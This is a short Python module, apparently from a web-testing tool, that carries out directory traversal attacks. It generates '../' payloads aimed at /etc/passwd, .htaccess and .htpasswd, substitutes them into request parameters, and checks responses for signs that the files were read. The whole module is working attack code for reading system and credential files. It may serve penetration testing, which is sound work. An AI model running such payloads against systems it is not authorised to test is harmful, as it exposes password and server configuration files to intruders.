#!/usr/local/bin/python3.5

"""
This script provides directory traversal functionality.
Is a naive scrips that generates directory traversal paths.
NOTE: unix only
"""


import requests

from modules.logger import logger
from modules.http import execute_request


dots = "../"
common_files = ["/etc/passwd",".htaccess",".htpasswd"]
common_check = ["root","boh","boh2"]

"""
Executes directory traversal attack
"""
def execute_traversal(s,request,check=common_check,fname=common_files):
    logger.debug("Executing directory traversal attack")
    params = request["params"]
    payloads = __payloadgenerator(fname)
    for park, parv in params.items():
        if parv == "?":
            for idx,p in enumerate(payloads):
                params[park] = p
                logger.debug("trying: "+p)
                logger.debug("looking for: "+check[idx%len(check)])
                r = execute_request(s,request)
                if check[idx%len(check)] in r.text:
                    return True
    return False


"""
Given a filename, this function returns a list of payloads that needs to be tested for performin
a directory traversal attack.
"""
def __payloadgenerator(fnames,depth=6):
    return [dots*i+f for i in range(depth) for f in fnames ]
